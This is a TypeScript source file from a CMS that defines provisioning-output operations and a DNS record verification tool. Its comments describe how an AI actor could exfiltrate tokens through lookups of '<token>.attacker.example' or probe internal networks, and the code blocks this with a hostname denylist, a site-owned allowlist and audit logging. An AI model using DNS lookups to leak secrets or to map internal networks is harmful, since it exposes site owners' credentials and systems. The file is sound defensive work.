// SPDX-License-Identifier: MPL-2.0

/**
 * P15 — provisioning_outputs ops.
 *
 *   provisioning_outputs.set  — system-only; cms-provision's
 *     `pulumi-output-sync` subcommand calls this after every `pulumi
 *     up` with the rendered output JSON.
 *   provisioning_outputs.get  — open read; the admin's /security/dns
 *     page consumes the latest snapshot per (provider, environment).
 */

import { defineOperation, type TransactionRunner } from "@caelo-cms/query-api";
import { err, ok } from "@caelo-cms/shared";
import { sql } from "drizzle-orm";
import { z } from "zod";
import { recordAudit, SYSTEM_ACTOR_ID } from "../audit.js";
import { jsonbParam } from "../sql-helpers.js";

const providerEnum = z.enum(["self-hosted", "gcp", "aws", "azure"]);
const environmentEnum = z.enum(["dev", "staging", "production"]);

export const setProvisioningOutputsOp = defineOperation({
  name: "provisioning_outputs.set",
  // Why system-only: written by the provisioning CLI with the stack outputs (DNS records, bootstrap
  // URL) — infrastructure facts, not an authoring choice; the AI reads them via verify_dns_records.
  actorScope: ["system"],
  database: "cms_admin",
  input: z
    .object({
      provider: providerEnum,
      environment: environmentEnum,
      outputs: z.record(z.string(), z.unknown()),
      // Optional caller-provided hash (sha256 of canonical JSON). When
      // missing the handler computes it itself — keeps the sync script
      // simple while still letting the CLI pre-compute if it wants to
      // skip a redundant write.
      outputsHash: z
        .string()
        .regex(/^[0-9a-f]{64}$/)
        .optional(),
    })
    .strict(),
  output: z.object({ updated: z.boolean() }),
  handler: async (ctx, input, tx) => {
    const json = JSON.stringify(input.outputs);
    const hash =
      input.outputsHash ??
      [...new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(json)))]
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");
    const rows = (await tx.execute(sql`
      INSERT INTO provisioning_outputs (provider, environment, outputs_json, outputs_hash)
      VALUES (${input.provider}, ${input.environment}, ${jsonbParam(json)}, ${hash})
      ON CONFLICT (provider, environment) DO UPDATE
        SET outputs_json = EXCLUDED.outputs_json,
            outputs_hash = EXCLUDED.outputs_hash,
            synced_at = now()
      RETURNING (xmax = 0) AS inserted
    `)) as unknown as Array<{ inserted: boolean }>;
    const updated = !rows[0]?.inserted;
    await recordAudit(tx, {
      actorId: SYSTEM_ACTOR_ID,
      requestId: ctx.requestId,
      operation: "provisioning_outputs.set",
      input: { provider: input.provider, environment: input.environment, outputsHash: hash },
      succeeded: true,
      resultSummary: updated ? "updated" : "inserted",
    });
    return ok({ updated });
  },
});

const dnsRecord = z.object({
  hostname: z.string(),
  type: z.enum(["A", "AAAA", "CNAME", "TXT"]),
  value: z.string(),
  purpose: z.string(),
});

export const getProvisioningOutputsOp = defineOperation({
  name: "provisioning_outputs.get",
  actorScope: ["human", "ai", "system"],
  database: "cms_admin",
  input: z
    .object({
      provider: providerEnum.optional(),
      environment: environmentEnum.optional(),
    })
    .strict(),
  output: z.object({
    rows: z.array(
      z.object({
        provider: providerEnum,
        environment: environmentEnum,
        // The admin UI doesn't need the full outputs blob — it only
        // renders DNS records + the bootstrap URL. Surface those
        // top-level so the load function stays small.
        dnsRecordsRequired: z.array(dnsRecord),
        bootstrapUrl: z.string().nullable(),
        adminDatabaseUrlPrefix: z.string().nullable(), // e.g. "postgresql://…/cms_admin" without password
        outputsHash: z.string(),
        syncedAt: z.string(),
      }),
    ),
  }),
  handler: async (_ctx, input, tx) => {
    const filterProvider = input.provider ? sql`AND provider = ${input.provider}` : sql.raw("");
    const filterEnv = input.environment ? sql`AND environment = ${input.environment}` : sql.raw("");
    const rows = (await tx.execute(sql`
      SELECT provider, environment, outputs_json, outputs_hash, synced_at
      FROM provisioning_outputs
      WHERE 1=1 ${filterProvider} ${filterEnv}
      ORDER BY synced_at DESC
    `)) as unknown as Array<{
      provider: string;
      environment: string;
      outputs_json: unknown;
      outputs_hash: string;
      synced_at: string | Date;
    }>;
    return ok({
      rows: rows.map((r) => {
        const outputs = (
          typeof r.outputs_json === "string" ? JSON.parse(r.outputs_json) : r.outputs_json
        ) as {
          dnsRecordsRequired?: Array<z.infer<typeof dnsRecord>>;
          bootstrapUrl?: string;
          adminDatabaseUrl?: string;
        };
        return {
          provider: r.provider as z.infer<typeof providerEnum>,
          environment: r.environment as z.infer<typeof environmentEnum>,
          dnsRecordsRequired: outputs.dnsRecordsRequired ?? [],
          bootstrapUrl: outputs.bootstrapUrl ?? null,
          adminDatabaseUrlPrefix: redactDsn(outputs.adminDatabaseUrl),
          outputsHash: r.outputs_hash,
          syncedAt: r.synced_at instanceof Date ? r.synced_at.toISOString() : String(r.synced_at),
        };
      }),
    });
  },
});

/** Strips the password segment from a postgres DSN before sending to the UI. */
function redactDsn(dsn: string | undefined): string | null {
  if (!dsn) return null;
  // postgresql://user:pw@host:port/db → postgresql://user:***@host:port/db
  return dsn.replace(/(postgres(?:ql)?:\/\/[^:]+:)[^@]+(@)/, "$1***$2");
}

/**
 * P15 review pass — hostname denylist for AI-callable DNS lookups.
 * Without this, an AI could call dns.verify_record({hostname:
 * "<token>.attacker.example", type: "TXT"}) to exfil tokens via
 * authoritative-DNS query logs, or probe internal-network resolution
 * patterns (10.x.x.x.in-addr.arpa, *.internal, *.local). Owner +
 * system actors bypass the denylist — they're trusted with arbitrary
 * lookups (e.g. validating a customer's externally-hosted domain).
 *
 * The list is scoped to internal-only suffixes per RFC 6761 + common
 * private patterns. Deliberately doesn't try to enumerate every
 * possible internal hostname pattern (that's a losing arms race);
 * instead we block the well-known reserved spaces and add an audit
 * entry for every AI call so suspicious patterns surface for review.
 */
const DNS_DENYLIST_SUFFIXES = [
  ".internal",
  ".local",
  ".lan",
  ".home",
  ".corp",
  ".intranet",
  ".private",
  ".in-addr.arpa",
  ".ip6.arpa",
];

function isHostnameDenied(hostname: string): boolean {
  // Strip the trailing dot — registrars routinely emit FQDNs as
  // `host.example.com.` and node:dns accepts both forms; without
  // normalisation `LOCALHOST.` would silently bypass the denylist.
  const lower = hostname.toLowerCase().replace(/\.$/, "");
  if (lower === "localhost") return true;
  // Numeric-only host labels are commonly attacker-rebinding scratchpads.
  if (/^\d+(\.\d+){0,3}$/.test(lower)) return true;
  for (const suffix of DNS_DENYLIST_SUFFIXES) {
    if (lower === suffix.slice(1) || lower.endsWith(suffix)) return true;
  }
  return false;
}

function normaliseHost(hostname: string): string {
  return hostname.toLowerCase().replace(/\.$/, "");
}

/**
 * The hostnames this site owns, for the AI-actor allowlist below: every
 * registered domain, the host of `site_defaults.site_base_url`, and every
 * hostname the provisioner stored as a required record. A lookup must be
 * one of these or a subdomain of one (`_acme-challenge.<domain>`).
 */
async function siteOwnedHostnames(tx: TransactionRunner): Promise<Set<string>> {
  const owned = new Set<string>();
  const domains = (await tx.execute(sql`SELECT hostname FROM domains`)) as unknown as {
    hostname: string;
  }[];
  for (const d of domains) owned.add(normaliseHost(d.hostname));
  const defaults = (await tx.execute(sql`
    SELECT site_base_url FROM site_defaults WHERE id = 1 LIMIT 1
  `)) as unknown as { site_base_url: string | null }[];
  const base = defaults[0]?.site_base_url;
  if (base) {
    try {
      owned.add(normaliseHost(new URL(base).hostname));
    } catch {
      // A malformed stored base URL owns nothing; the SEO settings surface it.
    }
  }
  const outputs = (await tx.execute(sql`
    SELECT outputs_json FROM provisioning_outputs
  `)) as unknown as { outputs_json: unknown }[];
  for (const r of outputs) {
    const json = (
      typeof r.outputs_json === "string" ? JSON.parse(r.outputs_json) : r.outputs_json
    ) as {
      dnsRecordsRequired?: { hostname?: unknown }[];
    };
    for (const rec of json.dnsRecordsRequired ?? []) {
      if (typeof rec.hostname === "string") owned.add(normaliseHost(rec.hostname));
    }
  }
  return owned;
}

function isOwnedHostname(hostname: string, owned: ReadonlySet<string>): boolean {
  const host = normaliseHost(hostname);
  for (const o of owned) {
    if (host === o || host.endsWith(`.${o}`)) return true;
  }
  return false;
}

export const verifyDnsRecordOp = defineOperation({
  name: "dns.verify_record",
  actorScope: ["human", "ai", "system"],
  database: "cms_admin",
  input: z
    .object({
      hostname: z.string().min(1).max(253),
      type: z.enum(["A", "AAAA", "CNAME", "TXT"]),
      expectedValue: z.string(),
    })
    .strict(),
  output: z.object({
    status: z.enum(["ok", "pending", "mismatch", "error"]),
    observed: z.array(z.string()),
    message: z.string().nullable(),
  }),
  handler: async (ctx, input, tx) => {
    if (ctx.actorKind === "ai" && isHostnameDenied(input.hostname)) {
      await recordAudit(tx, {
        actorId: ctx.actorId,
        requestId: ctx.requestId,
        operation: "dns.verify_record",
        input,
        succeeded: false,
        resultSummary: `denied: hostname ${input.hostname} matches internal/reserved denylist`,
      });
      return err({
        kind: "HandlerError",
        operation: "dns.verify_record",
        message:
          "hostname matches internal/reserved denylist — AI lookups are restricted to public domains",
      });
    }
    // An arbitrary public hostname is still an exfil channel: a lookup of
    // `<secret>.attacker.example` lands in the attacker's authoritative
    // query log. The AI only ever needs to check the site's OWN records,
    // so an AI lookup is limited to site-owned hostnames (and their
    // subdomains); the denylist above stays as the first wall.
    if (ctx.actorKind === "ai") {
      const owned = await siteOwnedHostnames(tx);
      if (!isOwnedHostname(input.hostname, owned)) {
        await recordAudit(tx, {
          actorId: ctx.actorId,
          requestId: ctx.requestId,
          operation: "dns.verify_record",
          input,
          succeeded: false,
          resultSummary: `denied: hostname ${input.hostname} is not a site-owned domain`,
        });
        return err({
          kind: "HandlerError",
          operation: "dns.verify_record",
          message:
            `hostname ${input.hostname} is not one of this site's domains — AI lookups are limited to registered domains (list_domains), ` +
            "the site's base URL host, the installer's required records, and their subdomains. Omit `records` to check the required records, or register the domain first (propose_add_domain).",
        });
      }
    }
    const dns = await import("node:dns/promises");
    const r = dns.Resolver ? new dns.Resolver({ timeout: 3000, tries: 1 }) : dns;
    try {
      let observed: string[] = [];
      switch (input.type) {
        case "A":
          observed = await r.resolve4(input.hostname);
          break;
        case "AAAA":
          observed = await r.resolve6(input.hostname);
          break;
        case "CNAME":
          observed = await r.resolveCname(input.hostname);
          break;
        case "TXT":
          observed = (await r.resolveTxt(input.hostname)).flat();
          break;
      }
      // CNAMEs come back without trailing dot from node:dns; strip from
      // expected too so a registrar-formatted "host." matches.
      const want = input.expectedValue.replace(/\.$/, "");
      const have = observed.map((v) => v.replace(/\.$/, ""));
      if (have.includes(want)) {
        return ok({ status: "ok" as const, observed: have, message: null });
      }
      if (have.length === 0) {
        return ok({
          status: "pending" as const,
          observed: have,
          message: "no records resolved yet — DNS may still be propagating",
        });
      }
      return ok({
        status: "mismatch" as const,
        observed: have,
        message: `expected ${want}, observed ${have.join(", ")}`,
      });
    } catch (e) {
      // ENOTFOUND / ENODATA → pending (registrar hasn't published yet).
      const msg = (e as Error).message;
      if (msg.includes("ENOTFOUND") || msg.includes("ENODATA")) {
        return ok({ status: "pending" as const, observed: [], message: msg });
      }
      return err({
        kind: "HandlerError",
        operation: "dns.verify_record",
        message: msg,
      });
    }
  },
});
